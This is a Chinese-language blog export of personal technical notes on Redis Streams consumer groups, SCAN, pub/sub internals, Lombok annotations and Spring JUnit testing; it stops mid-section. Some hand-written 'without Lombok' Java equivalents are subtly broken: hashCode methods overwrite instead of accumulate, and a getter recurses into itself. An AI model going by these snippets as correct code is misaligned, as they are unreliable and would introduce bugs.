XGROUP DELCONSUMER key groupname consumername


功能说明
在消费者组中删除消费者。消费者拥有的任何待处理消息在被删除后将变得不可领取。因此，强烈建议在从组中删除消费者之前声明或确认任何未决消息。


XGROUP DESTROY


命令详情
XGROUP DESTROY key groupname


功能说明
摧毁一个消费者组。即使有活跃的消费者和待处理的消息，消费者组也会被销毁，因此请确保仅在真正需要时才调用此命令。


XGROUP SETID


命令详情
XGROUP SETID key groupname   &lt;id | $ &gt;   [ENTRIESREAD entries_read]


功能说明
XGROUP SETID命令允许修改组的最后一个交付ID，而不必删除和重新创建组。例如，如果你想让消费者组中的消费者重新处理流中的所有消息，你可以将其下一个ID设置为0
XGROUP SETID mystream mygroup 0


XREADGROUP


命令详情
XREADGROUP GROUP group consumer [COUNT count]  [BLOCK milliseconds]  [NOACK] STREAMS key [key …] id [id …]


参数说明
id [id …]：

若id为 &gt; :  使用者只想接收从未传递给任何其他使用者的消息
任何其他ID，即 0 或任何其他有效ID或不完整ID（仅为毫秒时间部分），客户端访问的是：传递给它但尚未确认的消息（历史记录的概念）。注意，在这种情况下，BLOCK和NOACK都被忽略。



功能说明
使用 XREADGROUP  可以创建客户端组来消费到达给定流的消息的不同部分。例如，如果流获得新的条目 A、B 和 C，并且有两个消费者通过消费者组读取消息，一个客户端将获得消息 A 和 C，另一个客户端将获得消息 B。
但是要实现多个键中读取，您需要在每个流中创建一个具有相同名称的消费者组（不常见的需求）


举例
&gt; XGROUP CREATE mystream mygroup $ MKSTREAM&gt; XADD mystream * message apple&gt; XADD mystream * message orange&gt; XADD mystream * message strawberry&gt; XADD mystream * message apricot&gt; XRANGE mystream - +1) 1) "1675738497958-0"   2) 1) "message"      2) "apple"2) 1) "1675738498027-0"   2) 1) "message"      2) "orange"3) 1) "1675738498119-0"   2) 1) "message"      2) "strawberry"4) 1) "1675738498206-0"   2) 1) "message"      2) "apricot"            &gt; XREADGROUP GROUP mygroup Alice STREAMS mystream 01) 1) "mystream"   2) (empty array)&gt; XADD mystream * message banana"1675738604129-0"## 接收条目&gt; XREADGROUP GROUP mygroup Alice COUNT 1 STREAMS mystream &gt;1) 1) "mystream"   2) 1) 1) "1675738667048-0"         2) 1) "message"            2) "apple"         ## 已接收但是未确认的历史消息列表&gt; XREADGROUP GROUP mygroup Alice STREAMS mystream 01) 1) "mystream"   2) 1) 1) "1675738667048-0"         2) 1) "message"            2) "apple"        ## 确认消息&gt; XACK mystream mygroup 1675738667048-0(integer) 1## 已接收但是未确认的历史消息列表&gt; XREADGROUP GROUP mygroup Alice STREAMS mystream 01) 1) "mystream"   2) (empty array)   


 XACK


命令详情
XACK key group id [id …]


功能说明
XACK命令从流使用者组的Pending Entries List (PEL)中删除一条或多条消息。
客户端成功处理了一条消息，之后应该调用XACK，这样该消息就不会再次被处理，同时，关于该消息的 PEL条目也会被清除，从而从Redis服务器释放内存。


XPENDING


命令详情
XPENDING key group [[IDLE min-idle-time] start end count [consumer]]


功能说明
从消费者组PEL中 返回获取了但从未确认的消息信息和条目
## 前期&gt; XGROUP CREATE mystream mygroup $ MKSTREAM&gt; XADD mystream * message apple&gt; XADD mystream * message orange&gt; XADD mystream * message strawberry&gt; XADD mystream * message apricot&gt; XREADGROUP GROUP mygroup Alice COUNT 1 STREAMS mystream &gt;## 实验&gt; XPENDING mystream mygroup 1) (integer) 12) "1675739360459-0"3) "1675739360459-0"4) 1) 1) "Alice"      2) "1"&gt; XACK mystream mygroup 1675739360459-0(integer) 1&gt; XPENDING mystream mygroup 1) (integer) 02) (nil)3) (nil)4) (nil)


 XCLAIM


命令详情
XCLAIM  key group consumer  min-idle-time  id [id …]  [IDLE ms]
[TIME unix-time-milliseconds] [RETRYCOUNT count] [FORCE] [JUSTID]
[LASTID id]


功能说明
此命令用于更改待处理消息的 所有权。通常情况是这样的

STREAM 存在关联消费者组 group_a
某个consumer_a 在group_a的上下文中通过 XREADGROUP 从流中读取消息。
在group_a的待处理条目列表 (PEL) 中创建了一个待处理的消息条目：这意味着消息已传递给consumer_a ，但尚未通过 XACK 确认
然后突然之间，consumer_a 永远地失败了
其他消费者可能会使用XPENDING命令检查挂起的消息列表，这些消息已经过期很长时间了。为了继续处理此类消息，它们使用XCLAIM获取消息的所有权并继续。使用者还可以使用XAUTOCLAIM命令自动扫描和声明过期的待处理消息。

XCLAIM在以下情况下不会声明消息

消息在组PEL中不存在(即它从未被任何消费者读取)
消息存在于组PEL中，但不存在于流本身(即消息被读取但从未被确认，然后通过修剪或XDEL从流中删除)



命令参数
该命令有多个选项，但大多数主要用于内部使用，以便将XCLAIM或其他命令的效果传输到AOF文件中，并将相同的效果传播到副本中。


IDLE : 设置消息的空闲时间(最后一次发送)。如果没有指定IDLE，则假设IDLE为0，也就是说，时间计数将被重置，因为消息现在有一个新的所有者试图处理它。


TIME : 这与IDLE相同，但不是相对的毫秒数，它将空闲时间设置为特定的Unix时间(以毫秒为单位)。这对于重写生成XCLAIM命令的AOF文件非常有用。


RETRYCOUNT : 设置重试次数为指定值。每当再次传递消息时，此计数器都会增加。通常XCLAIM不会改变这个计数器，它只在调用XPENDING命令时提供给客户端:这样客户端就可以检测到异常情况，比如在尝试大量传递后由于某种原因从未处理过的消息。


FORCE: 在PEL中创建挂起的消息条目，即使某些指定的id还没有在分配给不同客户端的PEL中。但是消息必须在流中存在，否则不存在的消息id将被忽略。


JUSTID:  只返回成功声明的消息的id数组，而不返回实际的消息。使用此选项意味着重试计数器不增加。




使用举例：
&gt; XPENDING mystream mygroup 1) (integer) 02) (nil)3) (nil)4) (nil)&gt; XREADGROUP GROUP mygroup Alice COUNT 1 STREAMS mystream &gt;1) 1) "mystream"   2) 1) 1) "1675739360699-0"         2) 1) "message"            2) "apricot"&gt; XPENDING mystream mygroup 1) (integer) 12) "1675739360699-0"3) "1675739360699-0"4) 1) 1) "Alice"      2) "1" &gt; XCLAIM mystream mygroup Bob 300 1675739360699-01) 1) "1675739360699-0"   2) 1) "message"      2) "apricot" ## 使用 XCLAIM 之后 1675739360699-0 的消费者由 Alice 变更为 Bob&gt; XPENDING mystream mygroup 1) (integer) 12) "1675739360699-0"3) "1675739360699-0"4) 1) 1) "Bob"      2) "1"


XAUTOCLAIM 


命令详情
XAUTOCLAIM key group consumer  min-idle-time  start [COUNT count]
[JUSTID]


功能说明
从概念上讲，XAUTOCLAIM 等同于调用XPENDING，然后调用XCLAIM


基础命令：SCAN


命令详情
SCAN cursor [MATCH pattern] [COUNT count] [TYPE type]


命令参数解释
cursor ：开始迭代时的光标值为 0 / 上一次调用 SCAN 返回的光标以继续迭代
TYPE type：您可以使用 TYPE 选项要求 SCAN 仅返回与给定类型匹配的对象，从而允许您遍历数据库以查找特定类型的键。TYPE 选项仅在整个数据库 SCAN 上可用，而不是 HSCAN 或 ZSCAN 等。


使用DEMO
redis 127.0.0.1:6379&gt; sadd myset 1 2 3 foo foobar feelsgood(integer) 6redis 127.0.0.1:6379&gt; sscan myset 0 match f*1) "0"2) 1) "foo"   2) "feelsgood"   3) "foobar"redis 127.0.0.1:6379&gt;
重要的是要注意MATCH过滤器是在从集合中检索到元素之后应用的，就在将数据返回给客户端之前。
这意味着如果模式匹配集合中的极少元素，SCAN则在大多数迭代中可能不会返回任何元素。一个例子如下所示：
redis 127.0.0.1:6379&gt; scan 0 MATCH *11*1) "288"2) 1) "key:911"redis 127.0.0.1:6379&gt; scan 288 MATCH *11*1) "224"2) (empty list or set)redis 127.0.0.1:6379&gt; scan 224 MATCH *11*1) "80"2) (empty list or set)redis 127.0.0.1:6379&gt; scan 80 MATCH *11*1) "176"2) (empty list or set)redis 127.0.0.1:6379&gt; scan 176 MATCH *11* COUNT 10001) "0"2)  1) "key:611"    2) "key:711"    3) "key:118"    4) "key:117"    5) "key:311"    6) "key:112"    7) "key:111"    8) "key:110"    9) "key:113"   10) "key:211"   11) "key:411"   12) "key:115"   13) "key:116"   14) "key:114"   15) "key:119"   16) "key:811"   17) "key:511"   18) "key:11"redis 127.0.0.1:6379&gt;
如您所见，大多数调用返回零元素，但最后一次调用使用 COUNT 为 1000 以强制命令对该迭代进行更多扫描


]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-发布订阅</title>
    <url>/20221102/4cdb4706.html</url>
    <content><![CDATA[Redis  发布订阅简介

Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。

Redis 的 SUBSCRIBE 命令可以让客户端订阅任意数量的频道， 每当有新信息发送到被订阅的频道时， 信息就会被发送给所有订阅指定频道的客户端。
作为例子， 下图展示了频道 channel1 ， 以及订阅这个频道的三个客户端 —— client2 、 client5 和 client1 之间的关系：

当有新消息通过 PUBLISH 命令发送给频道 channel1 时， 这个消息就会被发送给订阅它的三个客户端：

发布/订阅使用

Redis有两种发布/订阅模式：

基于频道(Channel)的发布/订阅
基于模式(pattern)的发布/订阅


基于频道(Channel)的发布/订阅
"发布/订阅"模式包含两种角色，分别是发布者和订阅者。发布者可以向指定的频道(channel)发送消息; 订阅者可以订阅一个或者多个频道(channel),所有订阅此频道的订阅者都会收到此消息。



发布者发布消息
发布者发布消息的命令是 publish,用法是 publish channel message，如向 channel1.1说一声hi
127.0.0.1:6379&gt; publish channel:1 hi(integer) 1
这样消息就发出去了。返回值表示接收这条消息的订阅者数量。发出去的消息不会被持久化，也就是有客户端订阅channel:1后只能接收到后续发布到该频道的消息，之前的就接收不到了。


订阅者订阅频道
订阅频道的命令是 subscribe，可以同时订阅多个频道，用法是 subscribe channel1 [channel2 ...],例如新开一个客户端订阅上面频道:(不会收到消息，因为不会收到订阅之前就发布到该频道的消息)
127.0.0.1:6379&gt; subscribe channel:1Reading messages... (press Ctrl-C to quit)1) "subscribe" // 消息类型2) "channel:1" // 频道3) "hi" // 消息内容
执行上面命令客户端会进入订阅状态，处于此状态下客户端不能使用除subscribe、unsubscribe、psubscribe和punsubscribe这四个属于"发布/订阅"之外的命令，否则会报错。
进入订阅状态后客户端可能收到3种类型的回复。每种类型的回复都包含3个值，第一个值是消息的类型，根据消类型的不同，第二个和第三个参数的含义可能不同。
消息类型的取值可能是以下3个:

subscribe。表示订阅成功的反馈信息。第二个值是订阅成功的频道名称，第三个是当前客户端订阅的频道数量。
message。表示接收到的消息，第二个值表示产生消息的频道名称，第三个值是消息的内容。
unsubscribe。表示成功取消订阅某个频道。第二个值是对应的频道名称，第三个值是当前客户端订阅的频道数量，当此值为0时客户端会退出订阅状态，之后就可以执行其他非"发布/订阅"模式的命令了。




消息发布者
订阅者A
订阅者B




&gt; PUBLISH channel:a hi (integer) 0
&gt; SUBSCRIBE channel:a channel:b 1) “subscribe” 2) “channel:a” 3) (integer) 1 1) “subscribe” 2) “channel:b” 3) (integer) 2
&gt; SUBSCRIBE channel:b channel:c 1) “subscribe” 2) “channel:b” 3) (integer) 1 1) “subscribe” 2) “channel:c” 3) (integer) 2


&gt; PUBLISH channel:a hi (integer) 1
1) “message” 2) “channel:a” 3) “hi”



&gt; PUBLISH channel:b hello (integer) 2
1) “message” 2) “channel:b” 3) “hello”
1) “message”2) “channel:b”3) “hello”


&gt; PUBLISH channel:c lalalala (integer) 1

1) “message”2) “channel:c” 3) “lalalala”





基于模式(pattern)的发布/订阅
如果有某个/某些模式和这个频道匹配的话，那么所有订阅这个/这些频道的客户端也同样会收到信息。


用图例解释什么是基于模式的发布订阅
下图展示了一个带有频道和模式的例子， 其中 tweet.shop.* 模式匹配了 tweet.shop.kindle 频道和 tweet.shop.ipad 频道， 并且有不同的客户端分别订阅它们三个：

当有信息发送到 tweet.shop.kindle 频道时， 信息除了发送给 clientX 和 clientY 之外， 还会发送给订阅tweet.shop.*模式的 client123 和 client256 ：

另一方面， 如果接收到信息的是频道 tweet.shop.ipad ， 那么 client123 和 client256 同样会收到信息：



基于模式的例子
通配符中?表示1个占位符，*表示任意个占位符(包括0)，?*表示1个以上占位符。




消息发布者
订阅者A





准备

&gt; psubscribe a? b* d?* 1) “psubscribe”  2) “a?”  3) (integer) 1  1) “psubscribe”  2) “b” 3) (integer) 2  1) “psubscribe”  2) “d?”  3) (integer) 3 
&gt; psubscribe c? b* d?* “psubscribe”  2) “c?”  3) (integer) 1  1) “psubscribe”  2) “b” 3) (integer) 2  1) “psubscribe”  2) “d?”  3) (integer) 3


发送消息
&gt; publish a m1 (integer) 0




发送消息
&gt; publish a1 m1 (integer) 1
1) “pmessage”2) “a?”3) “a1”4) “m1”



发送消息
&gt; publish a11 m1 (integer) 0




发送消息
&gt; publish b abc (integer) 2
1) “pmessage” 2) “b*” 3) “b” 4) “abc”
1) “pmessage” 2) “b*” 3) “b” 4) “abc”


发送消息
&gt; publish c abc (integer) 0




发送消息
&gt; publish c1 m1 (integer) 1

1) “pmessage” 2) “c?” 3) “c1” 4) “m1”


发送消息
&gt; publish c11 m1 (integer) 0




发送消息
&gt; publish d m1 (integer) 0




发送消息
&gt; publish d1 m1 (integer) 2
1) “pmessage” 2) “d?*” 3) “d1” 4) “m1”
1) “pmessage” 2) “d?*” 3) “d1” 4) “m1”


发送消息
&gt; publish d11 m1 (integer) 2
1) “pmessage” 2) “d?*” 3) “d11” 4) “m1”
1) “pmessage” 2) “d?*” 3) “d11” 4) “m1”





注意点




使用psubscribe命令可以重复订阅同一个频道，如客户端执行了psubscribe c? c?*。这时向c1发布消息客户端会接受到两条消息，而同时publish命令的返回值是2而不是1。同样的，如果有另一个客户端执行了subscribe c1 和psubscribe c?*的话，向c1发送一条消息该客户顿也会受到两条消息(但是是两种类型:message和pmessage)，同时publish命令也返回2.


punsubscribe命令可以退订指定的规则，用法是: punsubscribe [pattern [pattern ...]],如果没有参数则会退订所有规则。


使用punsubscribe只能退订通过psubscribe命令订阅的规则，不会影响直接通过subscribe命令订阅的频道；同样unsubscribe命令也不会影响通过psubscribe命令订阅的规则。另外需要注意punsubscribe命令退订某个规则时不会将其中的通配符展开，而是进行严格的字符串匹配，所以punsubscribe * 无法退订c*规则，而是必须使用punsubscribe c*才可以退订。（它们是相互独立的，后文可以看到数据结构上看也是两种实现）


深入理解

我们通过几个问题，来深入理解Redis的订阅发布机制

基于频道(Channel)的发布/订阅如何实现的？
底层是通过字典（图中的pubsub_channels）实现的，这个字典就用于保存订阅频道的信息：字典的键为正在被订阅的频道， 而字典的值则是一个链表， 链表中保存了所有订阅这个频道的客户端。


数据结构
比如说，在下图展示的这个 pubsub_channels 示例中， client2 、 client5 和 client1 就订阅了 channel1 ， 而其他频道也分别被别的客户端所订阅：



订阅
当客户端调用 SUBSCRIBE 命令时， 程序就将客户端和要订阅的频道在 pubsub_channels 字典中关联起来。
举个例子，如果客户端 client10086 执行命令 SUBSCRIBE channel1 channel2 channel3 ，那么前面展示的 pubsub_channels 将变成下面这个样子：



发布
当调用 PUBLISH channel message 命令， 程序首先根据 channel 定位到字典的键， 然后将信息发送给字典值链表中的所有客户端。
比如说，对于以下这个 pubsub_channels 实例， 如果某个客户端执行命令 PUBLISH channel1 "hello moto" ，那么 client2 、 client5 和 client1 三个客户端都将接收到 “hello moto” 信息：


退订
使用 UNSUBSCRIBE 命令可以退订指定的频道， 这个命令执行的是订阅的反操作： 它从 pubsub_channels 字典的给定频道（键）中， 删除关于当前客户端的信息， 这样被退订频道的信息就不会再发送给这个客户端。


基于模式(Pattern)的发布/订阅如何实现的？
底层是pubsubPattern节点的链表。


数据结构
redisServer.pubsub_patterns 属性是一个链表，链表中保存着所有和模式相关的信息：
struct redisServer {    // ...    list *pubsub_patterns;    // ...};
链表中的每个节点都包含一个 redis.h/pubsubPattern 结构：
typedef struct pubsubPattern {    redisClient *client;    robj *pattern;} pubsubPattern;
client 属性保存着订阅模式的客户端，而 pattern 属性则保存着被订阅的模式。
每当调用 PSUBSCRIBE 命令订阅一个模式时， 程序就创建一个包含客户端信息和被订阅模式的 pubsubPattern 结构， 并将该结构添加到 redisServer.pubsub_patterns 链表中。
作为例子，下图展示了一个包含两个模式的 pubsub_patterns 链表， 其中 client123 和 client256 都正在订阅 tweet.shop.* 模式：
!
](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/db-redis-sub-9.svg)


订阅
如果这时客户端 client10086 执行 PSUBSCRIBE broadcast.list.* ， 那么 pubsub_patterns 链表将被更新成这样：

通过遍历整个 pubsub_patterns 链表，程序可以检查所有正在被订阅的模式，以及订阅这些模式的客户端。


发布
发送信息到模式的工作也是由 PUBLISH 命令进行的, 显然就是匹配模式获得Channels，然后再把消息发给客户端。


退订
使用 PUNSUBSCRIBE 命令可以退订指定的模式， 这个命令执行的是订阅模式的反操作： 程序会删除 redisServer.pubsub_patterns 链表中， 所有和被退订模式相关联的 pubsubPattern 结构， 这样客户端就不会再收到和模式相匹配的频道发来的信息。


SpringBoot结合Redis发布/订阅实例？
参考：https://blog.csdn.net/llll234/article/details/80966952
最佳实践是通过RedisTemplate，关键代码如下：
// 发布redisTemplate.convertAndSend("my_topic_name", "message_content");// 配置订阅RedisMessageListenerContainer container = new RedisMessageListenerContainer();container.setConnectionFactory(connectionFactory);container.addMessageListener(xxxMessageListenerAdapter, "my_topic_name");

]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Lombox日常使用记录</title>
    <url>/20221030/f1c78c8.html</url>
    <content><![CDATA[安装插件&amp;项目引入
Idea里需要安装lombok插件

pom.xml中引用
&lt;dependency&gt;        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;        &lt;artifactId&gt;lombok&lt;/artifactId&gt;        &lt;optional&gt;true&lt;/optional&gt;  &lt;/dependency&gt;
Lombok工作原理分析
会发现在Lombok使用的过程中，只需要添加相应的注解，无需再为此写任何代码。自动生成的代码到底是如何产生的呢？核心之处就是对于注解的解析上。JDK5引入了注解的同时，也提供了两种解析方式。

运行时解析

运行时能够解析的注解，必须将@Retention设置为RUNTIME，这样就可以通过反射拿到该注解。java.lang,reflect反射包中提供了一个接口AnnotatedElement，该接口定义了获取注解信息的几个方法，Class、Constructor、Field、Method、Package等都实现了该接口，对反射熟悉的朋友应该都会很熟悉这种解析方式。

编译时解析
编译时解析有两种机制，分别简单描述下：

Annotation Processing Tool
apt自JDK5产生，JDK7已标记为过期，不推荐使用，JDK8中已彻底删除，自JDK6开始，可以使用Pluggable Annotation Processing API来替换它，apt被替换主要有2点原因：

api都在com.sun.mirror非标准包下
没有集成到javac中，需要额外运行


Pluggable Annotation Processing API
JSR 269自JDK6加入，作为apt的替代方案，它解决了apt的两个问题，javac在执行的时候会调用实现了该API的程序，这样我们就可以对编译器做一些增强



Lombok本质上就是一个实现了“JSR 269 API”的程序。在使用javac的过程中，它产生作用的具体流程如下：1. javac对源代码进行分析，生成了一棵抽象语法树（AST）2. 运行过程中调用实现了“JSR 269 API”的Lombok程序此时Lombok就对第一步骤得到的AST进行处理，找到@Data注解所在类对应的语法树（AST），然后修改该语法树（AST），增加getter和setter方法定义的相应树节点3. javac使用修改后的抽象语法树（AST）生成字节码文件，即给class增加新的节点（代码块）
Lombok的优缺点
优点：1. 能通过注解的形式自动生成构造器、getter/setter、equals、hashcode、toString等方法，提高了一定的开发效率2. 让代码变得简洁，不用过多的去关注相应的方法3. 属性做修改时，也简化了维护为这些属性所生成的getter/setter方法等 缺点：1. 不支持多种参数构造器的重载2. 虽然省去了手动创建getter/setter方法的麻烦，但大大降低了源代码的可读性和完整性，降低了阅读源代码的舒适度
注解
@Slf4j
注解在类上；为类提供一个 属性名为log 的 log4j 日志对像
@Data
@Data注解在类上，会为类的所有属性自动生成setter/getter、equals、canEqual、hashCode、toString方法，如为final属性，则不会为该属性生成setter方法。
官方实例如下
import lombok.AccessLevel;import lombok.Data;import lombok.Setter;import lombok.ToString;@Datapublic class DataExample {  private final String name;  @Setter(AccessLevel.PACKAGE)  private int age;  private double score;  private String[] tags;  @ToString(includeFieldNames = true)  @Data(staticConstructor = "of")  public static class Exercise&lt;T&gt; {    private final String name;    private final T value;  }}
如不使用Lombok，则实现如下
import java.util.Arrays;public class DataExample {    private final String name;    private int age;    private double score;    private String[] tags;    public DataExample(String name) {        this.name = name;    }    public String getName() {        return this.name;    }    void setAge(int age) {        this.age = age;    }    public int getAge() {        return this.age;    }    public void setScore(double score) {        this.score = score;    }    public double getScore() {        return this.score;    }    public String[] getTags() {        return this.tags;    }    public void setTags(String[] tags) {        this.tags = tags;    }    @Override    public String toString() {        return "DataExample(" + this.getName() + ", " + this.getAge() + ", " + this.getScore() + ", " + Arrays.deepToString(this.getTags());    }    protected boolean canEqual(Object other) {        return other instanceof DataExample;    }    @Override    public boolean equals(Object o) {        if (o == this) return true;        if (!(o instanceof DataExample)) return false;        DataExample other = (DataExample) o;        if (!other.canEqual((Object) this)) return false;        if (this.getName() == null ? other.getName() != null : !this.getName().equals(other.getName())) return false;        if (this.getAge() != other.getAge()) return false;        if (Double.compare(this.getScore(), other.getScore()) != 0) return false;        if (!Arrays.deepEquals(this.getTags(), other.getTags())) return false;        return true;    }    @Override    public int hashCode() {        final int PRIME = 59;        int result = 1;        final long temp1 = Double.doubleToLongBits(this.getScore());        result = (this.getName() == null ? 43 : this.getName().hashCode());        result = this.getAge();        result = (int) (temp1 ^ (temp1 &gt;&gt;&gt; 32));        result = Arrays.deepHashCode(this.getTags());        return result;    }    public static class Exercise&lt;T&gt; {        private final String name;        private final T value;        private Exercise(String name, T value) {            this.name = name;            this.value = value;        }        public static &lt;T&gt; Exercise&lt;T&gt; of(String name, T value) {            return new Exercise&lt;T&gt;(name, value);        }        public String getName() {            return this.name;        }        public T getValue() {            return this.value;        }        @Override        public String toString() {            return "Exercise(name=" + this.getName() + ", value=" + this.getValue() + ")";        }        protected boolean canEqual(Object other) {            return other instanceof Exercise;        }        @Override        public boolean equals(Object o) {            if (o == this) return true;            if (!(o instanceof Exercise)) return false;            Exercise&lt;?&gt; other = (Exercise&lt;?&gt;) o;            if (!other.canEqual((Object) this)) return false;            if (this.getName() == null ? other.getValue() != null : !this.getName().equals(other.getName()))                return false;            if (this.getValue() == null ? other.getValue() != null : !this.getValue().equals(other.getValue()))                return false;            return true;        }        @Override        public int hashCode() {            final int PRIME = 59;            int result = 1;            result = (this.getName() == null ? 43 : this.getName().hashCode());            result = (this.getValue() == null ? 43 : this.getValue().hashCode());            return result;        }    }}
@Getter/@Setter
如果觉得@Data太过残暴（因为@Data集合了@ToString、@EqualsAndHashCode、@Getter/@Setter、@RequiredArgsConstructor的所有特性） 不够精细，可以使用@Getter/@Setter注解，此注解在属性上，可以为相应的属性自动生成Getter/Setter方法，示例如下：
import lombok.AccessLevel;import lombok.Getter;import lombok.Setter;public class GetterSetterExample {  @Getter  @Setter  private int age = 10;  @Setter(AccessLevel.PROTECTED)  private String name;  @Override  public String toString() {    return String.format("%s (age: %d)", name, age);  }}
如果不使用Lombok：
public class GetterSetterExample {  private int age = 10;  private String name;  @Override  public String toString() {    return String.format("%s (age: %d)", name, age);  }  public int getAge() {    return age;  }  public void setAge(int age) {    this.age = age;  }  protected void setName(String name) {    this.name = name;  }}
@NonNull
该注解用在属性或构造器上，Lombok会生成一个非空的声明，可用于校验参数，能帮助避免空指针。主要作用于成员变量和参数中，标识不能为空，否则抛出空指针异常。 示例如下：
import lombok.NonNull;public class NonNullExample extends Something {  private String name;  public NonNullExample(@NonNull Person person) {    super("Hello");    this.name = person.getName();  }}
不使用Lombok
import lombok.NonNull;public class NonNullExample extends Something {  private String name;  public NonNullExample(@NonNull Person person) {    super("Hello");    if (person == null) {      throw new NullPointerException("person");    }    this.name = person.getName();  }}
@Cleanup
@Cleanup：自动关闭资源，针对实现了java.io.Closeable接口的对象有效，如：典型的IO流对象
示例如下：
import java.io.*;import lombok.Cleanup;public class CleanupExample {  public static void main(String[] args) throws IOException {    @Cleanup    InputStream in = new FileInputStream(args[0]);    @Cleanup    OutputStream out = new FileOutputStream(args[1]);    byte[] b = new byte[10000];    while (true) {      int r = in.read(b);      if (r == -1) break;      out.write(b, 0, r);    }  }}
如不使用Lombok，则需如下：
import java.io.*;public class CleanupExample {  public static void main(String[] args) throws IOException {    InputStream in = new FileInputStream(args[0]);    try {      OutputStream out = new FileOutputStream(args[1]);      try {        byte[] b = new byte[10000];        while (true) {          int r = in.read(b);          if (r == -1) break;          out.write(b, 0, r);        }      } finally {        if (out != null) {          out.close();        }      }    } finally {      if (in != null) {        in.close();      }    }  }}
@EqualsAndHashCodes
​		默认情况下，会使用所有非静态（non-static）和非瞬态（non-transient）属性来生成equals和hasCode，也能通过exclude注解来排除一些属性。作用于类，覆盖默认的equals和hashCode
示例如下
import lombok.EqualsAndHashCode;@EqualsAndHashCode(exclude = { "id", "shape" })public class EqualsAndHashCodeExample {  private transient int transientVar = 10;  private String name;  private double score;  private Shape shape = new Square(5, 10);  private String[] tags;  private int id;  public String getName() {    return this.name;  }  @EqualsAndHashCode(callSuper = true)  public static class Square extends Shape {    private final int width, height;    public Square(int width, int height) {      this.width = width;      this.height = height;    }  }}
@ToString
类使用@ToString注解，Lombok会生成一个toString()方法，默认情况下，会输出类名、所有属性（会按照属性定义顺序），用逗号来分割。
通过将includeFieldNames参数设为true，就能明确的输出toString()属性。这一点是不是有点绕口，通过代码来看会更清晰些。
使用Lombok的示例：
import lombok.ToString;@ToString(exclude = "id")public class ToStringExample {  private static final int STATIC_VAR = 10;  private String name;  private Shape shape = new Square(5, 10);  private String[] tags;  private int id;  public String getName() {    return this.getName();  }  @ToString(callSuper = true, includeFieldNames = true)  public static class Square extends Shape {    private final int width, height;    public Square(int width, int height) {      this.width = width;      this.height = height;    }  }}
不使用Lombok的示例如下
package com.hots;import java.util.Arrays;public class ToStringExample {    private static final int STATIC_VAR = 10;    private String name;    private Shape shape = new Square(5, 10);    private String[] tags;    private int id;    public String getName() {        return this.getName();    }    public static class Square extends Shape {        private final int width, height;        public Square(int width, int height) {            this.width = width;            this.height = height;        }        @Override        public String toString() {            return "Square(super=" + super.toString() + ", width=" + this.width + ", height=" + this.height + ")";        }    }    @Override    public String toString() {        return "ToStringExample(" + this.getName() + ", " + this.shape + ", " + Arrays.deepToString(this.tags) + ")";    }}
@NoArgsConstructor、@RequiredArgsConstructor、@AllArgsConstructor
无参构造器、部分参数构造器、全参构造器。作用于类上，用于生成构造函数。有staticName、access等属性。staticName属性一旦设定，将采用静态方法的方式生成实例，access属性可以限定访问权限。
@NoArgsConstructor：生成无参构造器；@RequiredArgsConstructor：生成包含final和@NonNull注解的成员变量的构造器；@AllArgsConstructor：生成全参构造器
Lombok没法实现多种参数构造器的重载。
Lombok示例代码如下：
import lombok.AccessLevel;import lombok.AllArgsConstructor;import lombok.NonNull;import lombok.RequiredArgsConstructor;@RequiredArgsConstructor(staticName = "of")@AllArgsConstructor(access = AccessLevel.PROTECTED)public class ConstructorExample&lt;T&gt; {  private int x, y;  @NonNull  private T description;  @NoArgsConstructor  public static class NoArgsExample {    @NonNull    private String field;  }}
不使用Lombok的示例如下
public class ConstructorExample&lt;T&gt; {  private int x, y;  @NonNull  private T description;  private ConstructorExample(T description) {    if (description == null) throw new NullPointerException("description");    this.description = description;  }  public static &lt;T&gt; ConstructorExample&lt;T&gt; of(T description) {    return new ConstructorExample&lt;T&gt;(description);  }  @java.beans.ConstructorProperties({ "x", "y", "description" })  protected ConstructorExample(int x, int y, T description) {    if (description == null) throw new NullPointerException("description");    this.x = x;    this.y = y;    this.description = description;  }  public static class NoArgsExampmle {    @NonNull    private String field;    public NoArgsExample() {}  }}
@Log
作用于类上，生成日志变量。针对不同的日志实现产品，有不同的注解
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Lombox</category>
      </categories>
      <tags>
        <tag>Lombox</tag>
      </tags>
  </entry>
  <entry>
    <title>Junit日常使用记录</title>
    <url>/20221030/99356519.html</url>
    <content><![CDATA[使用Spring配合Junit进行单元测试的总结
jar包导入
&lt;dependency&gt;     &lt;groupId&gt;org.springframework&lt;/groupId&gt;     &lt;artifactId&gt;spring-test&lt;/artifactId&gt;     &lt;version&gt;3.2.4.RELEASE&lt;/version&gt;     &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;
直接对spring中注入的bean进行测试(以DAO为例)
在测试类上添加
 @RunWith 注解指定使用springJunit的测试运行器@ContextConfiguration 注解指定测试用的spring配置文件的位置
之后我们就可以注入我们需要测试的bean进行测试。Junit在运行测试之前会先解析spring的配置文件,初始化spring中配置的bean
@RunWith(SpringJUnit4ClassRunner.class)@ContextConfiguration(locations = { "classpath*:spring-config-test.xml" })public class TestProjectDao {  @Autowired  ProjectDao projectDao;  @Test  public void testCreateProjectCode() {    long applyTime = System.currentTimeMillis();    Timestamp ts = new Timestamp(applyTime);    Map codeMap = projectDao.generateCode("5", "8", ts, "院内");    String projectCode = (String) codeMap.get("_project_code");    Timestamp apply_time = (Timestamp) codeMap.get("_apply_time");    System.out.print(projectCode);    System.out.print(apply_time.toString());    Assert.assertTrue(projectCode.length() == 12);  }}
对SpringMVC进行测试
Spring3.2之后出现了org.springframework.test.web.servlet.MockMvc 类,对springMVC单元测试进行支持。样例如下：
